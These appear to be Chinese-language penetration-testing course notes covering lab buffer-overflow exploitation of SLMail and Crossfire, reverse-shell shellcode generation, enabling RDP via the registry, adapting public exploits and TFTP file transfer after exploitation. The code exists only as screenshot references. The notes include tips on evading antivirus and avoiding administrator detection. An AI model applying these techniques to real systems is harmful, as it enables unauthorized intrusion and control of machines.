+<p>多说一句的就是slmail这个程序不支持dep，也不支持alsr这两种内存保护机制的，所以可以在地址里面随便选一个实现跳转</p>
+<p>如果有一个程序支持dep的，那么在这一步的时候就必须，找到内存地图的倒数第二列（访问权限）必须是RE两个权限都有的（r读e可执行）</p>
+<p>（这就是绕过dep的一种方法）</p>
+<p>好，多说一句说完了，那么现在已经找到了FFE4的内存地址——f54b41e3</p>
+<p>找到以后就在这里设置一个断点</p>
+<p> <img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504215009128.png" alt="image-20200504215009128"></p>
+<p>只要访问到这里就中断，再debugger开始运行</p>
+<p>设断点主要是为了脚本溢出的时候是不是正常的进行了跳转</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504215148136.png" alt="image-20200504215148136"></p>
+<p> 08.py</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504215444219.png" alt="image-20200504215444219"></p>
+<p>放入EIP的地址就是刚刚的5f 4b 41 e3,但由于内存里是反转放置的，也就是先放e3 41 4b 5f。</p>
+<p>也就是EIP填好了，那么就应该到系统模块，再跳回ESP，再填入390个C</p>
+<p>发送出去看debugger，发现已经暂停了，因为程序已经跳到了系统模块的地址，而这个地址设置了 断点</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200505094614006.png" alt="image-20200505094614006"></p>
+<p>说明EIP跳转正常</p>
+<p>下面断电运行一步 ，按F7，跳转到了0157a154，也就是ESP的地址</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200505094912450.png" alt="image-20200505094912450"></p>
+<p>下一步就要制作shellcode</p>
+<p>可以自己用Scratch自己写shellcode</p>
+<p>也可以用现成的，即msfpayload</p>
+<p>shellcode是payload的一个子集</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200505095141844.png" alt="image-20200505095141844"></p>
+<p>如果有自己的后门程序的话，也可以把你的程序转换成十六进制，发到ESP里，当然也得足够小，1-2m肯定不行</p>
+<p>看看msfpayload框架有多少个shellcode</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200505095535409.png" alt="image-20200505095535409"></p>
+<p>针对不同的系统又不同的shellcode</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200505095613362.png" alt="image-20200505095613362"></p>
+<p>win32 adduser就是添加一个用户</p>
+<p>win32 bind 绑定开放一个端口（这个就能作为这次的shellcode，让xp开放一个端口，我nc连上去就能直接控制系统）</p>
+<p>（但问题就是作为服务器的，通常由网络边界，有防火墙，只允许从外向内指定的端口）</p>
+<p>（所以正向的连接服务器基本没用了，一般是倒过来，让服务器反向连接我）</p>
+<p>这就要用反向连接的payload——win32_reverse </p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200505100432254.png" alt="image-20200505100432254"></p>
+<p>LHOST就是要连接的ip（就是kali的ip）LPORT端口</p>
+<p>C 表示是C语言格式</p>
+<p>输出了一段十六进制串</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200505100448100.png" alt="image-20200505100448100"></p>
+<p>但有一个问题需要注意，有坏字符</p>
+<p>试一试有没有坏字符</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200505100549860.png" alt="image-20200505100549860"></p>
+<p>0d有，那就不能直接用</p>
+<p>这种情况还有一个工具msfencode，同样一段代码，可以通过它编码之后把特征字符改变（所以这个工具也可以做免杀）</p>
+<p>同样的用管道前面生成的不能是C语言格式，而应该是R——raw原始格式</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200505100902412.png" alt="image-20200505100902412"></p>
+<p>嗯确实没有坏字符了</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200505100935048.png" alt="image-20200505100935048"></p>
+<p>把这串shellcode放到脚本里</p>
+<p>09.py</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200505101042031.png" alt="image-20200505101042031"></p>
+<p>刚从终端复制过来，没条末尾要改成+号  </p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200505101145881.png" alt="image-20200505101145881"></p>
+<p>shellcode前又加了8个\x90，（汇编转换成十六进制后为90的命令是“nop”——no opreation不操作，经验上 跳完第一个就开始运行shellcode，可能因为cpu工作机制导致前几个字节被擦除掉）</p>
+<p>连续的一段nop以后再跟着shellcode会被连续的执行（一个规律） </p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200505102100438.png" alt="image-20200505102100438"></p>
+<p>这个脚本执行以后应该回连我机器444端口</p>
+<p>先把我的444端口打开</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200505102156690.png" alt="image-20200505102156690"></p>
+<p>现在甚至都没必要开调试工具了，进程打开就可以</p>
+<p>.\09.py后，果然</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200505102318144.png" alt="image-20200505102318144"></p>
+<p>可以 进行一系列操作了</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200505102429106.png" alt="image-20200505102429106"></p>
+<p>到这里已经完全控制了目标机器</p>
+<p>多说一句 </p>
+<p>先退出出来，再侦听，再运行脚本</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200505102606072.png" alt="image-20200505102606072"></p>
+<p>就又拿到了shell</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200505102640588.png" alt="image-20200505102640588"></p>
+<p>但这是一个挺完美的状态，经常出现的是（早期msfpayload的shellcode代码，会发生下面的情况）</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200505102708780.png" alt="image-20200505102708780"></p>
+<p>即只溢出一次，服务就崩溃了（其他软件可能也会发生）</p>
+<p>服务崩溃就很容易引起管理员的发现，所以</p>
+<p>尽量让攻击的退出方式以线程的方式退出，不要直接停止整个进程</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200505103241111.png" alt="image-20200505103241111"></p>
+<p>方法就是在生成shellcode处添加黄字的参数</p>
+<p>刚刚能看到新的msfpayload的shellcode，没有崩溃，可能是更新了（默认添加了这个参数）</p>
+<p>（这个得再考究一下）</p>
+<p>另外，前面的09.py有一个老师之前准备的系统模块的地址，这个地址会成功吗？</p>
+<p>（这个地址也是与刚刚 同一个系统模块里固定不变的地址）</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200505103602436.png" alt="image-20200505103602436"></p>
+<p>发现也能成功，说明之前在系统模块里搜到的符合的地址都能实现</p>
+<p>除了命令行方式控制，能不能拿到图形化管理页面呢？</p>
+<p>1、拿到命令行之后可以ftp下载一个图形化的木马管理程序</p>
+<p>2、也可以使用payload的时候就使用看到图形化的payload</p>
+<p>3、最简单的七八年前的方式，第一能想到的就是RDP</p>
+<p>利用RDP得修改注册表（windows大部分的配置的参数选项都是再注册表的，而linux都是在软件的配置文件）</p>
+<p>（老师在之前实验中——通过快照抓取的方式筛选出了打开远程桌面的注册表的几个键值）</p>
+<p>（现在也能直接在网上搜到了）</p>
+<p>可以看到当前xp的远程桌面是没有打开的</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200505104122492.png" alt="image-20200505104122492"></p>
+<p>（这个界面在我的电脑右键属性）</p>
+<p>下面要通过注册表的方式把它打开</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200505104236918.png" alt="image-20200505104236918"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200505104555294.png" alt="image-20200505104555294"></p>
+<p>（这里开放的是3389端口，虽然后面老师连接没有添加3389端口，但也知道一下）</p>
+<p>最后一行是执行reg文件，reg文件是windows下的注册表文件，可以把注册表导出出来成为一个reg进行保存，如果对注册表进行了修改，就可以用reg进行恢复</p>
+<p>最后一行之前的都执行完，果然已经出现了3389.reg这个文件，执行它，远程桌面就应该打开了</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200505104651951.png" alt="image-20200505104651951"></p>
+<p>可能要重启之后才能打开</p>
+<p>shutdown -r -t 0</p>
+<p>重启之后远程桌面打开了且有了访问权</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200505104820188.png" alt="image-20200505104820188"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200505104836692.png" alt="image-20200505104836692"></p>
+<p>回到kali安装一个远程桌面的工具（ 这是一个linux下的windows远程桌面工具）</p>
+<p>（又发现防火墙里设置禁止远程桌面，这里先跳过吧，手动打开它）</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200505105351485.png" alt="image-20200505105351485"></p>
+<p>发现空密码是无法连接的 </p>
+<p>在命令行里设置账户和密码</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200505105429330.png" alt="image-20200505105429330"></p>
+<p>再输入</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200505105447115.png" alt="image-20200505105447115"></p>
+<p>就能连上了</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200505105501876.png" alt="image-20200505105501876"></p>
+<p>有一部异议的及时防火墙那里，这步也可以找到防火墙的注册表的键值，也可以命令行打开</p>
+<p>（windows99%的配置都是放在注册表上的）</p>
+<p>那么怎么找键值呢（我够不够选远程桌面这个勾，改变的是哪个键值呢？）</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200505105806588.png" alt="image-20200505105806588"></p>
+<p>这个可以抓取注册表的变化知道</p>
+<p>有一个工具叫regsnap，它可以对注册表当时实时状态的快照，然后对防火墙手动开启，在快照，做快照比较就知道了哪个键值了</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200505105953744.png" alt="image-20200505105953744"></p>
+<p>因为系统本身也会发生一些变化，因此新建快照之前把要改的准备好，尽量快的拍两次快照，避免其他干扰</p>
+<p>工具栏第一个就是新建快照，第六个就是比较</p>
+<p>比较之后有删除的主键、修改的主键，</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200505110251851.png" alt="image-20200505110251851"></p>
+<p>可以看到有两个3389的修改，那就是这两个了</p>
+<p>把这俩记下来，按<img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200505110340298.png" alt="image-20200505110340298"></p>
+<p>这种格式把路径</p>
+<p>再按这种格式</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200505110430313.png" alt="image-20200505110430313"></p>
+<p>把键值也echo进去reg</p>
+<p>一执行就能开端口了</p>
+<h6 id="Linux缓冲区溢出"><a href="#Linux缓冲区溢出" class="headerlink" title="Linux缓冲区溢出"></a>Linux缓冲区溢出</h6><p>这次选区的是一个游戏的服务器端程序</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200508210748154.png" alt="image-20200508210748154"></p>
+<p>是一个比较老的版本，新的版本已经</p>
+<p>运行平台使用的是32位的kali（32位的cpu），原因在于，地址总线的位数，最大寻址空间2^32次方，在32位上进行比64位简单很多</p>
+<p>其实上一节的winxp，也是32位的</p>
+<p>deb在</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200508212659451.png" alt="image-20200508212659451"></p>
+<p>界面类似</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200508212718792.png" alt="image-20200508212718792"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200508213024893.png" alt="image-20200508213024893"></p>
+<p>linux也有</p>
+<p>本机调试</p>
+<p>如何让外人只能连接我的13327端口呢？</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200508213211558.png" alt="image-20200508213211558"></p>
+<p>且怎么只允许127.0.0.1来访问13327端口呢 </p>
+<p>我们之前将slmail没有严格设置防火墙限制外人访问的</p>
+<p>要使用shell实现溢出的时候，要使用4444端口</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200508213727574.png" alt="image-20200508213727574"></p>
+<p>这次实验里攻击机的ip不重要，本次攻击机与被攻击机都在同一台虚拟机上</p>
+<p>edb调用进程，直接调用起来并监控，但程序还没有运行</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200508214257402.png" alt="image-20200508214257402"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200508214244847.png" alt="image-20200508214244847"></p>
+<p>注意要点两次run，第一次只是run了debugger，第二次run才会运行游戏进程</p>
+<p>此时edb会又调起一个控制台查看游戏进程的状态</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200508214424644.png" alt="image-20200508214424644"></p>
+<p>看一下端口，确实游戏进程启动起来了</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200508214454249.png" alt="image-20200508214454249"></p>
+<p>同样的，首要关注的就是EIP<img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200508214616966.png" alt="image-20200508214616966"></p>
+<p>后与immunidebugger不同的是，不能直接看到EIP里存放的下一条指令的地址，要双击一下（才能看到寄存器里的内容）</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200508214726110.png" alt="image-20200508214726110"></p>
+<p>因为现在还在侦听，所以是全0</p>
+<p>服务器端就准备好了</p>
+<p>01.py</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200508214814087.png" alt="image-20200508214814087"></p>
+<p>与windows的脚本不太一样，linux的服务器端程序，只有发出的字符串是一个确定的数值，才会发生缓冲区溢出</p>
+<p>（事实上4380、4378都会发生，但他们溢出的时候没有办法精确修改EIP的内容）</p>
+<p>\x11是一个设备调用的指令代号，setup sound，指这个缓冲区溢出是存在于setup sound这个指令里面</p>
+<p>运行01.py以后，发生了溢出，EIP不知道下一条要怎么执行了</p>
+<p>edb就会爆出一条消息</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200508215339517.png" alt="image-20200508215339517"></p>
+<p>右键EIP<img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200508215412251.png" alt="image-20200508215412251"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200508215419752.png" alt="image-20200508215419752"></p>
+<p>确实</p>
+<p>后来演示了如果是4378个A，EIP就不是A了，也不是三个A，是乱码了</p>
+<p>只有当是4379的时候才能精确溢出EIP寄存器</p>
+<p>定位第几个字符位EIP位置，方法还是用唯一字符串</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200508215906318.png" alt="image-20200508215906318"></p>
+<p>创建唯一字符串，复制粘贴到脚本里</p>
+<p>02.py</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200508215950210.png" alt="image-20200508215950210"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200508220010225.png" alt="image-20200508220010225"></p>
+<p>找这串是第几个字符</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200508220049496.png" alt="image-20200508220049496"></p>
+<p>03.py</p>
+<p>看看是不是低4368个字符</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200508220153618.png" alt="image-20200508220153618"></p>
+<p>确实</p>
+<p>同时看一下ESP，右键follow in dump</p>
+<p>在下面的框里能看到数据页了</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200508220441529.png" alt="image-20200508220441529"></p>
+<p>ESP是紧跟EIP的，所以这里ESP只有7个字节了，肯定不够放了啊</p>
+<p>就在剩下的寄存器里找，比如ESI、EDI，内容都是A，似乎可以找一下第几个字符</p>
+<p>但右键follow in dump，但发现不行，说明访问不了地址，那就都用不了 </p>
+<p>而有的寄存器比如EDX，能访问地址但内容全是0，说明没溢出到那里，页用不了</p>
+<p>最后发下EAX能用，且follow in dump</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200508221248772.png" alt="image-20200508221248772"></p>
+<p>全是A，</p>
+<p>（而且能发现开头就是setup sound，其实之前的4000多个A都在这个寄存器里）</p>
+<p>那是不是就可以在这里放shellcode了呢 （但前十二个字符不能动，必须要指定是setup sound指令）</p>
+<p>所以双击看到地址后加上十二，让脚本直接跳转到setup spund后面）</p>
+<p>这样理论上就肯定能成功了（把EIP内容改为EAX的地址。EAX里放shellcode）</p>
+<p>但其实会有一个问题，EAX这个地址是与操作系统有关系的，换一台机器十有八九就不行了</p>
+<p>所以一样要采用分两步走的方法</p>
+<p>ESP只能存7个字符，shellcode一定是要放EAX的，所以在ESP上做打算（记得 </p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200508222442718.png" alt="image-20200508222442718"></p>
+<p>还是使用用过的一个工具 metasploit下面的一个ruby脚本</p>
+<p>这个是把汇编指令转变为二进制，看看能不能存下这些</p>
+<p>add eax,12 就是加上偏移量 </p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514195747124.png" alt="image-20200514195747124"></p>
+<p>这两个转完只要5个字节，而ESP能放下7个字节所以 够</p>
+<p>再把这五个字节携程16禁止形式就是最后的\x83…</p>
+<p>  最后把剩下的两个字符也填满\x90，</p>
+<p><strong>03.py</strong></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514200043899.png" alt="image-20200514200043899"></p>
+<p>运行一下03.py，发现EIP寄存器又被修改成全B，再看ESP，和填入的一样</p>
+<p>现在的问题是怎么同EIP跳转到ESP，不行，因为ESP的地址也会变化的，所以找 jmp ESP的指令</p>
+<p>使用edb的一个插件</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514200358311.png" alt="image-20200514200358311"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514200421657.png" alt="image-20200514200421657"></p>
+<p>选择第一个进程，因为大概率会一直存在</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514200441972.png" alt="image-20200514200441972"></p>
+<p>发现地址是08134597</p>
+<p>这样EIP到ESP，再偏移，跳转到EAX，EAX里面全都是四千多个B，其中替换一部分位shellcode</p>
+<p><strong>准备shellcode</strong></p>
+<p><strong>先找坏字符</strong></p>
+<p>直接告诉我们了坏字符有<img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514200657039.png" alt="image-20200514200657039"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514200733582.png" alt="image-20200514200733582">   </p>
+<p>我们已经找到08134597是jmp EIP的地址（当然别忘了高地址低位）</p>
+<p>所以看crash</p>
+<p>准备shellcode前，先试一下步骤  </p>
+<p><strong>04.py</strong></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514201154582.png" alt="image-20200514201154582"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514201240379.png" alt="image-20200514201240379"></p>
+<p>再冲运行之前先再搜索一下ESP到EIP，确实地址没变 </p>
+<p>再设一个端点</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514201328080.png" alt="image-20200514201328080"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514201343696.png" alt="image-20200514201343696"></p>
+<p> 再运行04.py</p>
+<p>F8是往下运行一部，在左上是正在运行的汇编指令</p>
+<p>生成shellcode</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514201555973.png" alt="image-20200514201555973"></p>
+<p>这是一个开放端口的shellcode</p>
+<p> <img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514201806760.png" alt="image-20200514201806760"></p>
+<p><strong>05.py</strong></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514202049181.png" alt="image-20200514202049181">  </p>
+<p>运行以后就应该打开了4444端口</p>
+<p>额出现了问题，可能是hsellcode出错了</p>
+<p>用老师准备好的脚本</p>
+<p><strong>06.py</strong></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514202254135.png" alt="image-20200514202254135"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514202314343.png" alt="image-20200514202314343"></p>
+<p>再nc4444端口就能执行了root权限操作</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514202333631.png" alt="image-20200514202333631"></p>
+<p>之前的问题可能是不同的msfpayload</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514202639236.png" alt="image-20200514202639236"></p>
+<p>最后发现重启一下就好了</p>
+<h6 id="选择和修改exp"><a href="#选择和修改exp" class="headerlink" title="选择和修改exp"></a>选择和修改exp</h6><p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514203245274.png" alt="image-20200514203245274"></p>
+<p>exploit-db之前提过，好像也是网站，searchsploit是命令</p>
+<p>还有网站</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514203452848.png" alt="image-20200514203452848"></p>
+<p>不断新披露的漏洞，有的有利用代码，有的没 有</p>
+<p>下面以一个实例演示一下</p>
+<p>拿到一个不熟悉语言的利用代码时候要注意的环境</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514203932824.png" alt="image-20200514203932824"></p>
+<p>比如找一下slmail的利用代码</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514204221342.png" alt="image-20200514204221342"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514204231691.png" alt="image-20200514204231691"></p>
+<p>看一下发现和之前自己写的有些区别</p>
+<p> <img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514204313124.png" alt="image-20200514204313124"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514204321752.png" alt="image-20200514204321752"></p>
+<p>偏移量不太一样（之前是3000多个A），shellcode也不一样</p>
+<p>而c语言的脚本（ppt里面的）（gedit 加c语言文件）</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514204446664.png" alt="image-20200514204446664"></p>
+<p>拿到c的脚本</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514204538589.png" alt="image-20200514204538589"></p>
+<p>c程序必须编译为二进制</p>
+<p> <img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514204758661.png" alt="image-20200514204758661"></p>
+<p>缺一个模块，需要去安装 </p>
+<p>发现646.c用到了</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514204937522.png" alt="image-20200514204937522"></p>
+<p>后连个是windows环境下的模块</p>
+<p>但是不是必须要再windows环境下呢，也不是</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514205054307.png" alt="image-20200514205054307"></p>
+<p>再linux下像运行windows的程序或编译的话，要先安装mingw32</p>
+<p>还要安装wine32</p>
+<p>mingw32是编译的程序，运行还需要wine</p>
+<p>编译的时候使用<img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514205652803.png" alt="image-20200514205652803"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514205732186.png" alt="image-20200514205732186"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514205848589.png" alt="image-20200514205848589"></p>
+<p>执行</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514205943299.png" alt="image-20200514205943299"></p>
+<p>为什么知道后面要加ip地址，看代码，代码里面printf里面有写</p>
+<p>再来看一下643.c（ceossfire的）</p>
+<p>这里就没有win的库了，但它使用的shellcode是反向连接的，所以这里的shellcode必须被替换</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514210403046.png" alt="image-20200514210403046"></p>
+<p>不同系统甚至补丁不同都可能导致偏移量不同</p>
+<p>所以要扫描目标系统版本， </p>
+<h6 id="后漏洞利用阶段"><a href="#后漏洞利用阶段" class="headerlink" title="后漏洞利用阶段"></a>后漏洞利用阶段</h6><p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514210700192.png" alt="image-20200514210700192"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514210707965.png" alt="image-20200514210707965"></p>
+<p>操作系统和应用程序都有可能有日志</p>
+<p>slmail为例</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514211027157.png" alt="image-20200514211027157"></p>
+<p>记事本打开</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514211048253.png" alt="image-20200514211048253"></p>
+<p>可以看到非法命令 一堆AAAAAAAAAA</p>
+<p>且显示出了ip地址</p>
+<p>安装后门或者也叫木马 </p>
+<p>也可以dump密码来离线的方式破解</p>
+<p>最常见的合法远程连接软件，比如nc</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514223028240.png" alt="image-20200514223028240"></p>
+<p>所以下面的内容都是针对windows</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514223153987.png" alt="image-20200514223153987"></p>
+<p>以winxp为例 </p>
+<p>再kali上得到shell</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514223305583.png" alt="image-20200514223305583"></p>
+<p>这是基于nc的侦听的shell</p>
+<p>非交互的shell</p>
+<p>典型表现就是没有补全功能  </p>
+<p>再xp下安装ftp</p>
+<p> <img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514223659992.png" alt="image-20200514223659992"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514223721341.png" alt="image-20200514223721341"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514224001482.png" alt="image-20200514224001482"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514224009193.png" alt="image-20200514224009193"></p>
+<p>安装完以后，再kali里使用ftp</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514224053285.png" alt="image-20200514224053285"></p>
+<p>输入完用户名之后就会一直停留到这里而不会显示子命令</p>
+<p>xp里</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514224223041.png" alt="image-20200514224223041"></p>
+<p>基于这种考虑，要尽量使用交互式的shell而尽量避免nc这样的shell </p>
+<p>可以准备自己的如布尔、灰鸽子等等把这些程序传到目标机器上</p>
+<p>今天主要将怎么把这样的软件传上去</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514224622302.png" alt="image-20200514224622302"></p>
+<p><strong>第一个就是TFTP</strong></p>
+<p>基于UDP协议，不支持身份认证，不加密</p>
+<p> 接下来，我们在kali船舰一个目录，指定为tftp的主目录，复制一个nc的程序</p>
+<p>再windows上实现把nc程序下载下来</p>
+<p>chown是在该权限  nobody是所有者，很低的权限</p>
+<p>kali里其实放了一些windows的程序</p>
+<p>atftpd是启动</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514225551975.png" alt="image-20200514225551975"></p>
+<p>这里是有问题的，不应该是inetd</p>
+<p>原因是文件夹权限是nobody，但里面考进来的文件时root的</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514225744083.png" alt="image-20200514225744083"></p>
+<p>把这个目录及目录下所有文件</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514230006733.png" alt="image-20200514230006733"></p>
+<p>最后发现后台服务的进程时atftpd了</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514230221497.png" alt="image-20200514230221497"></p>
+<p>-i 表示用二进制的方式传输文件</p>
+<p>现在是windows回连kali</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514230526260.png" alt="image-20200514230526260"></p>
+<p>dir看一下确实</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514230539804.png" alt="image-20200514230539804"> </p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514230737890.png" alt="image-20200514230737890"></p>
+<p>都运行起来</p>
+<p>tasklist看一下</p>
